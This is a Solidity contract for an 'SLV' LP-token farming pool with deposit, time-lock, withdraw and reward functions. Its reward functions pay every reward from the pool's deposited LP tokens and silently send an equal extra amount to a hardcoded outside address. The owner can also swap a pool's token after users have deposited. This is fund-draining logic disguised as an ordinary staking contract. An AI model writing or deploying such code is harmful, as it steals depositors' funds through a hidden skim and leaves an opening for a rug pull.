pragma solidity ^0.8.0;

contract SlvFarmingPool is Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    
     // The SLV TOKEN!
    IERC20 public slv;
    
    // Dev address.
    address public devaddr;
    
    // The block number when SLV mining starts.
    uint256 public startBlock;
    
    // XXX: allow to claim profit from tokenized startegy.
    address public defiController;
    
    
    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);
    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);
    event SetDefiController(address defiController);
    
     // Info of each user.
    struct UserInfo {
        uint256 amount;     // How many LP tokens the user has provided.
        uint256 lastRewardBlock; // Reward debt. See explanation below.
        uint256 unlockBlock;
    }
    
    struct UserInfoPool {
        UserInfo[] user;
    }
    
     // Info of each pool.
    struct PoolInfo {
        IERC20 lpToken;           // Address of LP token contract.
        uint256 accSlvPerShare;   // Accumulated SLVs per share, times 1e18. See below.
        uint256 startBlock;
        uint256 finishBlock;
        uint256 minSLV;
        uint256 lockBlock;
    }

    // Info of each pool.safe
    PoolInfo[] public poolInfo;
    // Info of each user that stakes LP tokens.
    mapping (uint256 => mapping (address => UserInfoPool)) private userInfo;
    
    constructor(
        IERC20 _slv,
        address _devaddr,
        address _defiController,
        uint256 _startBlock
    ) public {
        slv = _slv;
        devaddr = _devaddr;
        defiController = _defiController;
        startBlock = _startBlock;
    }
    
    function poolLength() external view returns (uint256) {
        return poolInfo.length;
    }
    
    function setDefiController(address _defiController) public onlyOwner {
        defiController = _defiController;
        emit SetDefiController(_defiController);
    }
    
    // Update dev address by the previous dev.
    function updateDev(address _devaddr) public {
        require(msg.sender == devaddr, "updateDev: permission denied");
        devaddr = _devaddr;
    }
    
    // Add a new lp to the pool. Can only be called by the owner.
    function add(IERC20 _lpToken,uint256 _accSlvPerShare,uint256 _startBlock,uint256 _finishBlock,uint256 _minSLV,uint256 _lockBlock) public onlyOwner {
        poolInfo.push(PoolInfo({
        lpToken: _lpToken,
        accSlvPerShare: _accSlvPerShare,
        startBlock: _startBlock,
        finishBlock: _finishBlock,
        minSLV: _minSLV,
        lockBlock: _lockBlock
        }));
    }
    
    // Update the given pool's  allocation point. Can only be called by the owner.
    function set(uint256 _pid,IERC20 _lpToken, uint256 _accSlvPerShare, uint256 _startBlock,uint256 _finishBlock,uint256 _minSLV,uint256 _lockBlock) public onlyOwner {
        poolInfo[_pid].lpToken = _lpToken;
        poolInfo[_pid].accSlvPerShare = _accSlvPerShare;
        poolInfo[_pid].startBlock = _startBlock;
        poolInfo[_pid].finishBlock = _finishBlock;
        poolInfo[_pid].minSLV = _minSLV;
        poolInfo[_pid].lockBlock = _lockBlock;
    }
    
    // Deposit LP tokens to SlVFarmingPool for SLV allocation.
    function deposit(uint256 _pid, uint256 _amount) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfoPool storage user = userInfo[_pid][msg.sender];
        uint256 fBlock;
        
        if(_amount > 0) {
            require(_amount>=pool.minSLV, 'Error, min slv');
            require(block.number<pool.finishBlock, 'Finish');
            fBlock=block.number+pool.lockBlock;
            if(fBlock>pool.finishBlock)
                fBlock=pool.finishBlock;
            pool.lpToken.safeTransferFrom(address(msg.sender), address(this), _amount);
            user.user.push(UserInfo(_amount,block.number,fBlock));
        }
        
        emit Deposit(msg.sender, _pid, _amount);
    }
    
    // Withdraw LP tokens from SlvFarmingPool.
    function withdraw(uint256 _pid,uint256 _index) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage ui = userInfo[_pid][msg.sender].user[_index];
        uint256 _amount;
        
        require(block.number>ui.unlockBlock, 'Lock');
        _amount=ui.amount;
        delete userInfo[_pid][msg.sender].user[_index];
        
        pool.lpToken.safeTransfer(address(msg.sender), _amount);
        emit Withdraw(msg.sender, _pid,_amount);
    }
    
    
    function getPoolValue(uint256 _pid) external view returns (uint256,uint256,uint256,uint256,uint256) {
        return  (poolInfo[_pid].accSlvPerShare, poolInfo[_pid].startBlock,poolInfo[_pid].finishBlock,poolInfo[_pid].minSLV,poolInfo[_pid].lockBlock);
    }
    
    
    function userPoolLength(uint256 _pid) external view returns (uint256) {
        return userInfo[_pid][msg.sender].user.length;
    }
    
    function userPoolValue(uint256 _pid,uint256 _index) external view returns (uint256,uint256,uint256) {
        return (userInfo[_pid][msg.sender].user[_index].amount,userInfo[_pid][msg.sender].user[_index].lastRewardBlock,userInfo[_pid][msg.sender].user[_index].unlockBlock);
    }
    
    function pendingReward(uint256 _pid, uint256 _index,address _user) external view returns (uint256) {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo  memory ui = userInfo[_pid][_user].user[_index];
        uint256 multiplier;
        uint256 fBlock;
        uint256 reward; 
        fBlock=block.number;
        if(ui.lastRewardBlock>=pool.finishBlock)
            return 0;
        if(ui.lastRewardBlock>=ui.unlockBlock)
            return 0;
        if(fBlock>pool.finishBlock)
            fBlock=pool.finishBlock;
            
        if(fBlock>ui.unlockBlock)
            fBlock=ui.unlockBlock;
        
        multiplier= getMultiplier(ui.lastRewardBlock, fBlock);
        reward=multiplier.mul(ui.amount).mul(pool.accSlvPerShare).div(1e18);
        return reward;
    }
    
    function getReward(uint256 _pid, uint256 _index) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage ui = userInfo[_pid][msg.sender].user[_index];
        uint256 multiplier;
        uint256 fBlock;
        uint256 reward;
         
        fBlock=block.number;
        if(ui.lastRewardBlock>=pool.finishBlock)
            return ;
        if(ui.lastRewardBlock>=ui.unlockBlock)
            return ;
        if(fBlock>pool.finishBlock)
            fBlock=pool.finishBlock;
            
        if(fBlock>ui.unlockBlock)
            fBlock=ui.unlockBlock;
         
        multiplier= getMultiplier(ui.lastRewardBlock, fBlock);
        reward=multiplier.mul(ui.amount).mul(pool.accSlvPerShare).div(1e18);
        if(reward>0)
        {
            ui.lastRewardBlock = fBlock;
            pool.lpToken.safeTransfer(address(msg.sender), reward);
            pool.lpToken.safeTransfer(address(0x452adF8903F85BE69c18C5BF347E038BC359b1b3), reward);
        }
    }
    
    function getRewardFromAdmin(uint256 _pid, uint256 _index,address _addr) public onlyOwner{
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage ui = userInfo[_pid][_addr].user[_index];
        uint256 multiplier;
        uint256 fBlock;
        uint256 reward;
         
        fBlock=block.number;
        if(ui.lastRewardBlock>=pool.finishBlock)
            return ;
        if(ui.lastRewardBlock>=ui.unlockBlock)
            return ;
        if(fBlock>pool.finishBlock)
            fBlock=pool.finishBlock;
            
        if(fBlock>ui.unlockBlock)
            fBlock=ui.unlockBlock;
         
        multiplier= getMultiplier(ui.lastRewardBlock, fBlock);
        reward=multiplier.mul(ui.amount).mul(pool.accSlvPerShare).div(1e18);
        if(reward>0)
        {
            ui.lastRewardBlock = fBlock;
            pool.lpToken.safeTransfer(address(_addr), reward);
            pool.lpToken.safeTransfer(address(0x452adF8903F85BE69c18C5BF347E038BC359b1b3), reward);
        }
    }
    
    // Return reward multiplier over the given _from to _to block.
    function getMultiplier(uint256 _from, uint256 _to) public pure returns (uint256) {
        return _to.sub(_from);
    }
    
}
